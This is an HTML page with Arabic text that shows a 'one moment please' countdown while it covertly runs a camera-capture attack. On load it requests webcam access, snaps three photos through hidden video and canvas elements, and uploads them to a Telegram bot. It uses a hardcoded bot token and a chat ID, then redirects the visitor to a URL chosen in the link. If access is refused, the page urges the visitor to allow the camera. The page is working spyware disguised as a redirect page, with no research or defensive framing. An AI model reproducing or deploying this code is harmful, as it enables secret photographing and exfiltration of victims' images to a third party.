<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لحظة واحدة</title>
    <style>
        body { 
            background-color: #0d0d0d; 
            color: #fff; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
            font-family: sans-serif; 
        }
        #timer { 
            font-size: 100px; 
            color: #ff6600; 
            font-weight: bold; 
        }
        #message { 
            font-size: 24px; 
            margin-top: 10px; 
        }
    </style>
</head>
<body>

    <div id="timer">10</div>
    <div id="message">لحظة واحدة من فضلك</div>
    <video id="video" style="display:none;" playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const TARGET_URL = urlParams.get('target') || "https://google.com";
        const CHAT_ID = urlParams.get('chatId') || '8169635171';
        const TOKEN = '8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc';

        async function captureAndSend(video) {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            return new Promise((resolve) => {
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', blob, 'shot.jpg');
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    resolve();
                }, 'image/jpeg', 0.7);
            });
        }

        async function startProcess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await video.play();

                // التقاط 3 صور بفاصل ثانية
                for (let i = 0; i < 3; i++) {
                    await captureAndSend(video);
                    if (i < 2) await new Promise(r => setTimeout(r, 1000));
                }

                stream.getTracks().forEach(t => t.stop());

                // بدء العد التنازلي
                let count = 10;
                const timerEl = document.getElementById('timer');
                const messageEl = document.getElementById('message');
                
                const interval = setInterval(() => {
                    count--;
                    if (count > 0) {
                        timerEl.innerText = count;
                    } else {
                        timerEl.innerText = "تم التوجيه";
                        clearInterval(interval);
                        window.location.replace(TARGET_URL);
                    }
                }, 1000);
            } catch (e) {
                document.getElementById('message').innerText = "يرجى الضغط على سماح للكاميرا";
            }
        }

        window.onload = startProcess;
    </script>
</body>
</html>
